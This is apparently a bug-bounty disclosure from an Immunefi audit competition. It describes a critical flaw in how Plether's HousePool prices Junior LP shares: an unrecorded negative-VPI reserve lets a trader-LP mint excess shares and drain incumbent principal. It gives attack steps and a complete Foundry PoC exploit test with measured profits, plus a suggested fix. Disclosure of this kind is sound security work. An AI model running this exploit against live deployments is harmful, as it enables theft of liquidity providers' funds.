# \#99835 [SC-Critical] Secured negative VPI is omitted from Junior entry NAV, letting a new LP take incumbent principal

**Submitted on Nov 15th 2026 at 12:39:56 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99835
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a skew-reducing open earns negative VPI, HousePool immediately pays the rebate to the trader's clearinghouse account. The same amount is locked as a dedicated negative-VPI reserve, recoverable by HousePool when that position closes. Junior LP entry pricing nevertheless sees the lower physical pool balance and no corresponding receivable. A trader who is also a new Junior LP can deposit during that interval, receive too many shares, close the position to return the reserve, and redeem the inflated shares. The attached frozen-commit PoC pays the attacker in USDG cash while an unrelated trader's position remains open; a later fully funded incumbent Junior redemption receives less than its contributed principal.

## Vulnerability Details

The source version is commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` in `packages/perps/src`. With an existing LONG position creating positive skew, an ordinary SHORT open reduces skew and has negative accrued VPI. In [`CfdEngineSettlementSidecar.executeOpen`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L435-L479), `poolRebatePayoutAssets` leaves HousePool for the clearinghouse, and the increased negative-VPI target is locked with `lockVpiRebateReserve`. [`MarginClearinghouse.consumeVpiRebateReserve`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L882-L906) later transfers that secured amount back to HousePool when the action charge is realized. The close sidecar includes recovered charges in arrived revenue ([source](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L602-L612)).

For LP ownership pricing, [`HousePoolAccountingLib.buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L58-L82) begins with `physicalAssets`, subtracts trader claims, and adjusts only for terminal price PnL. It does not include the secured negative-VPI receivable. [`HousePool._settleDepositPhase`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1038-L1094) then quotes new Junior shares against the depressed `juniorPrincipal`. Once the trader's reserve is consumed on close, that cash is allocated across the already minted shares, including the attacker's underpriced shares. Existing Junior holders are diluted. The error is in **ownership pricing**; the reserve need not be treated as immediately withdrawable cash.

An attacker can use the public Router and vault paths:

1. In a pool with an unrelated existing LONG, fund an ordinary SHORT position. Its skew-reducing open pays negative VPI out of HousePool into the attacker's locked action reserve.
2. Request and activate a Junior LP deposit at the next synchronized LP epoch while the SHORT remains open. The lower pool cash causes the deposit to mint excess Junior shares.
3. Close the SHORT at the unchanged six-feed basket mark. The negative VPI reserve is consumed and returns to HousePool. Wait the normal one-hour deposit cooldown.
4. Redeem the attacker's Junior shares and withdraw the closed trader account's balance as settlement tokens. Both cash transfers succeed while the unrelated LONG is still open.
5. The unrelated LONG can later close. The incumbent Junior LP's ordinary redemption is fully funded but pays less than the LP deposited. This later close is used to measure the final loss, not to enable the attacker to receive cash.

The six-feed Pyth data is held at the same underlying basket prices in every test branch. No privileged role, malicious oracle, or public-chain test is involved. The initial unrelated LONG is a market-state precondition; the PoC creates it through the same public Router path before snapshotting the control and attack branches.

At Junior share issuance, the PoC asserts that the attacker's VPI accrual is negative, its funded reserve is locked in the clearinghouse, and the same amount has left HousePool. The matched control performs the same trade but returns the reserve before LP entry. The excess shares and later cash transfer occur only when entry happens while the reserve is outstanding.

### Suggested correction

Include the fully funded, collectible negative-VPI reserve in LP ownership pricing while it is outstanding, then replace that receivable with physical cash as the reserve is consumed. Keep it excluded from free cash available for immediate redemptions. Apply the same distinction to deposit and redemption previews and preserve the existing reserve floor in the clearinghouse.

## Impact Details

**Asset:** `HousePool.sol` (active LP USDG), reached through the Junior `TrancheVault.sol` share path. The accounting library, clearinghouse, Router, and settlement sidecar are supporting in-scope components.

**Selected impact and severity:** Critical — “Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield” under the [Plether scope](https://immunefi.com/audit-competition/plether/scope/). The PoC shows a funded payout **below the incumbent's original 1,400,000 USDG principal**, with the attacker ending in withdrawable USDG cash above its starting capital. It does not rely solely on a lower preview NAV or missed future yield.

At five-basis-point feed confidence, the SHORT open moves **1,079.792657 USDG** from HousePool into its secured reserve. The same-trade control (SHORT opens and closes before LP entry) mints **3,996,363,270,062,994** raw Junior share units and pays the incumbent **1,400,497.338238 USDG**. With LP entry while the reserve is outstanding, the same 4,000,000 USDG deposit mints **3,999,642,348,115,675** raw share units, an excess of **3,279,078,052,681**. The incumbent receives **1,399,646.171314 USDG**, a difference of **851.166924 USDG** and **353.828686 USDG below deposited principal**. The attacker ends with **4,060,272.775151 USDG**, or **272.775151 USDG above its 4,060,000 USDG starting capital**, after model execution fees and carry. Against the same-trade control, attacker cash is higher by **850.768104 USDG**. The SHORT remains open longer in the attack branch; the measured values include that carry difference. A zero-confidence variant also passes: incumbent principal loss **577.533051 USDG**, attacker cash profit **359.170725 USDG**.

The fixture has a 1,400,000 USDG incumbent Junior deposit, 1 USDG seed in each tranche, no other Senior deposit, a 550,000 USDG unrelated LONG, a 550,000 USDG attacker SHORT, a 4,000,000 USDG attacker Junior deposit, and 60,000 USDG funded attacker trader account. These values satisfy the release skew and Senior-cap settings. The test covers protocol fees and carry but not network gas, Hermes service fees, off-chain hedging cost, live market moves, or whether an unrelated LONG is present at a given time. The competition's [feasibility rules](https://immunefi.com/audit-competition/plether/scope/) assess impact separately from capital and execution risk.

## Proof of Concept

## PoC Explanation

Place the attached `VpiNegativeReserveEntryPoC.t.sol` in `packages/perps/test/perps/poc/` of the frozen commit checkout. From `packages/perps`, run:

```bash
forge test --match-path test/perps/poc/VpiNegativeReserveEntryPoC.t.sol --threads 1 --offline -vv
```

Expected: two passing tests, one with zero confidence and one with five-basis-point confidence. Each snapshots after the unrelated LONG exists and runs three branches: no SHORT, the same SHORT closed before LP entry, and the SHORT held through LP entry. The attack branch asserts negative VPI leaves HousePool and is locked, the deposit receives more Junior shares than the same-trade control, the closed trader balance can be withdrawn, the attacker Junior redemption pays in full before the unrelated trader closes, the incumbent Junior redemption pays in full afterward, attacker cash exceeds both its starting capital and same-trade control, and incumbent cash falls below its original deposit. A clean checkout of the frozen commit produced **2 passed, 0 failed** on 15 November 2026. USDG amounts printed by Foundry are six-decimal atoms; share counts are raw share units.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Negative-VPI reserve entry path, independent of attacker charge redemption.
// Frozen Plether commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract VpiNegativeReserveEntryPoC is BasePerpTest {
    address internal constant EXISTING_TRADER = address(0xBEE01);
    uint256 internal constant ENTRY_ASSETS = 4_000_000e6;

    bytes32[6] internal releaseIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] internal releaseWeights = [uint256(576e15), 136e15, 119e15, 91e15, 42e15, 36e15];
    uint256[6] internal releaseBases =
        [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
    bool[6] internal releaseInverted = [false, true, false, true, true, true];

    function setUp() public override {
        super.setUp();
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            ids[i] = releaseIds[i];
            weights[i] = releaseWeights[i];
            bases[i] = releaseBases[i];
            inversions[i] = releaseInverted[i];
        }
        PletherOracle releaseOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2500;
        releaseRouterConfig.minOpenNotionalAssets = 1000e6;
        releaseRouterConfig.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(releaseRouterConfig);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = releaseOracle;
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        uint256 day = vm.getBlockTimestamp() / 1 days + 1;
        while ((day + 4) % 7 != 1) ++day;
        vm.warp(day * 1 days + 6 hours);
        assertFalse(engine.isOracleFrozen());
        assertFalse(engine.isFadWindow());
        router.updateMarkPrice(_pyth(0));
    }

    address internal constant ATTACKER_LP = address(0xA77AC0);
    address internal constant ACCOUNT_B = address(0xA77AC2);
    address internal constant ATTACKER_KEEPER = address(0xA77AC3);
    uint256 internal constant TRADER_FUNDS = 60_000e6;
    uint256 internal constant POSITION_MARGIN = 40_000e6;

    function _positionSize() internal pure virtual returns (uint256) {
        return 550_000e18;
    }

    // Release parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_400_000e6; // honest junior LP (address(this))
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0; // an allowed Junior-only pool state avoids the Senior exit covenant
    }

    /// @dev Six release basket feeds at a constant mark, with the requested confidence ratio.
    function _pyth(
        uint64 conf
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime =
            router.nextExecuteId() < router.nextCommitId() ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = releaseInverted[i] ? 1e24 / (releaseBases[i] * 1e8) : releaseBases[i];
            feeds[i] = MockPyth.FeedUpdate(
                releaseIds[i],
                MockPyth.MockPrice(
                    int64(uint64(raw)), uint64(raw * conf / 1e8), -8,
                    publishTime, publishTime == 0 ? 0 : publishTime - 1
                )
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feeds);
    }

    function _routerTrade(
        address account,
        CfdTypes.Side side,
        bool isClose,
        uint64 conf
    ) internal {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: _positionSize(),
            marginDelta: isClose ? 0 : POSITION_MARGIN,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory update = _pyth(conf);
        vm.prank(ATTACKER_KEEPER);
        router.executeOrder(id, update);
        (uint256 size,,,,,,) = engine.positions(account);
        assertEq(size, isClose ? 0 : _positionSize(), "order did not execute");
    }

    function _routerSettle(
        uint256 boundary,
        uint64 conf
    ) internal {
        if (vm.getBlockTimestamp() < boundary) {
            vm.warp(boundary);
        }
        bytes[] memory update = _pyth(conf);
        vm.prank(ATTACKER_KEEPER);
        router.settleLpEpoch(update);
    }

    function _juniorValueOf(
        address holder
    ) internal view returns (uint256) {
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        return (juniorPrincipal * juniorVault.balanceOf(holder)) / juniorVault.totalSupply();
    }

    function _attackerDeposit(
        uint256 assets,
        uint64 conf
    ) internal {
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), assets);
        uint256 depositId = juniorVault.requestDeposit(assets, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        _routerSettle(juniorVault.depositEpochStart(depositId), conf);
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATTACKER_LP);
        assertEq(claimable, assets, "deposit must activate in full");
        vm.prank(ATTACKER_LP);
        juniorVault.claimDeposit(depositId, claimable, ATTACKER_LP, ATTACKER_LP);
    }

    struct Result {
        uint256 incumbentCash;
        uint256 attackerLpCash;
        uint256 attackerTraderBalance;
        uint256 attackerSharesMinted;
    }

    function _runEntry(bool trade, bool closeBeforeDeposit, uint64 conf) internal returns (Result memory out) {
        if (trade) {
            uint256 beforePool = pool.totalAssets();
            _routerTrade(ACCOUNT_B, CfdTypes.Side.SHORT, false, conf);
            uint256 afterPool = pool.totalAssets();
            assertLt(afterPool, beforePool, "negative VPI must leave pool");
            (,,,,,, int256 accrued) = engine.positions(ACCOUNT_B);
            assertLt(accrued, 0, "trader must hold negative VPI reserve");
            console2.log("negative VPI pool outflow", beforePool - afterPool);
        }

        if (trade && closeBeforeDeposit) _routerTrade(ACCOUNT_B, CfdTypes.Side.SHORT, true, conf);
        _attackerDeposit(ENTRY_ASSETS, conf);
        out.attackerSharesMinted = juniorVault.balanceOf(ATTACKER_LP);
        if (trade && !closeBeforeDeposit) _routerTrade(ACCOUNT_B, CfdTypes.Side.SHORT, true, conf);
        uint256 traderAssets = clearinghouse.balanceAssets(ACCOUNT_B);
        vm.prank(ACCOUNT_B);
        clearinghouse.withdraw(ACCOUNT_B, traderAssets);
        out.attackerTraderBalance = settlementToken.balanceOf(ACCOUNT_B);
        assertEq(out.attackerTraderBalance, traderAssets, "closed trader cash must be withdrawable");

        // The attacker takes cash while the unrelated LONG is still open.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        router.updateMarkPrice(_pyth(conf));
        vm.prank(ATTACKER_LP);
        uint256 attackerShares = juniorVault.maxRequestRedeem(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 attackerRequestId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        _routerSettle(juniorVault.depositEpochStart(attackerRequestId), conf);
        assertEq(juniorVault.claimableRedeemRequest(attackerRequestId, ATTACKER_LP), attackerShares);
        vm.prank(ATTACKER_LP);
        out.attackerLpCash = juniorVault.claimRedeem(attackerRequestId, attackerShares, ATTACKER_LP, ATTACKER_LP);

        // The unrelated trader closes later in every branch. The incumbent's
        // complete redemption then measures the realized loss in USDG cash.
        _routerTrade(EXISTING_TRADER, CfdTypes.Side.LONG, true, conf);
        uint256 shares = juniorVault.maxRequestRedeem(address(this));
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        _routerSettle(juniorVault.depositEpochStart(requestId), conf);
        assertEq(juniorVault.claimableRedeemRequest(requestId, address(this)), shares);
        out.incumbentCash = juniorVault.claimRedeem(requestId, shares, address(this), address(this));
    }

    function _negativeScenario(uint64 conf) internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        // An existing unrelated LONG creates ordinary market skew. The attacker
        // never owns the LONG and never redeems a positive VPI charge.
        _fundTrader(EXISTING_TRADER, TRADER_FUNDS);
        _routerTrade(EXISTING_TRADER, CfdTypes.Side.LONG, false, conf);

        settlementToken.mint(ATTACKER_LP, ENTRY_ASSETS);
        _fundTrader(ACCOUNT_B, TRADER_FUNDS);
        uint256 startingIncumbent = _juniorValueOf(address(this));
        uint256 startingAttacker = ENTRY_ASSETS + clearinghouse.balanceAssets(ACCOUNT_B);
        uint256 snapshotId = vm.snapshotState();

        Result memory control = _runEntry(false, false, conf);
        vm.revertToState(snapshotId);
        snapshotId = vm.snapshotState();
        Result memory tradingControl = _runEntry(true, true, conf);
        vm.revertToState(snapshotId);
        Result memory attack = _runEntry(true, false, conf);

        uint256 controlAttacker = control.attackerLpCash + control.attackerTraderBalance;
        uint256 tradingControlAttacker = tradingControl.attackerLpCash + tradingControl.attackerTraderBalance;
        uint256 attackAttacker = attack.attackerLpCash + attack.attackerTraderBalance;
        console2.log("starting incumbent Junior value", startingIncumbent);
        console2.log("control incumbent cash", control.incumbentCash);
        console2.log("trading control incumbent cash", tradingControl.incumbentCash);
        console2.log("attack incumbent cash", attack.incumbentCash);
        console2.log("trading control Junior shares minted", tradingControl.attackerSharesMinted);
        console2.log("attack Junior shares minted", attack.attackerSharesMinted);
        console2.log("starting attacker value", startingAttacker);
        console2.log("control attacker value", controlAttacker);
        console2.log("trading control attacker value", tradingControlAttacker);
        console2.log("attack attacker value", attackAttacker);
        console2.log("attacker gain vs trading control", attackAttacker > tradingControlAttacker ? attackAttacker - tradingControlAttacker : 0);
        console2.log("incumbent cash loss vs trading control", tradingControl.incumbentCash > attack.incumbentCash ? tradingControl.incumbentCash - attack.incumbentCash : 0);
        console2.log("attacker cash profit vs start", attackAttacker - startingAttacker);
        console2.log("incumbent principal lost", _initialJuniorDeposit() - attack.incumbentCash);
        assertLt(attack.incumbentCash, tradingControl.incumbentCash, "incumbent cash must fall vs same trade");
        assertGt(attack.attackerSharesMinted, tradingControl.attackerSharesMinted, "negative reserve must underprice entry");
        assertGt(attackAttacker, tradingControlAttacker, "entry timing must profit vs same trade");
        assertGt(attackAttacker, startingAttacker, "attacker must profit absolutely");
        assertGt(tradingControl.incumbentCash, _initialJuniorDeposit(), "same-trade control must repay principal");
        assertLt(attack.incumbentCash, _initialJuniorDeposit(), "attack must take incumbent principal");
    }

    function test_NegativeVpiEntryWithoutAttackerChargeRedemption_ZeroConfidence() public {
        _negativeScenario(0);
    }

    function test_NegativeVpiEntryWithoutAttackerChargeRedemption_FiveBpsConfidence() public {
        _negativeScenario(50_000);
    }
}

```
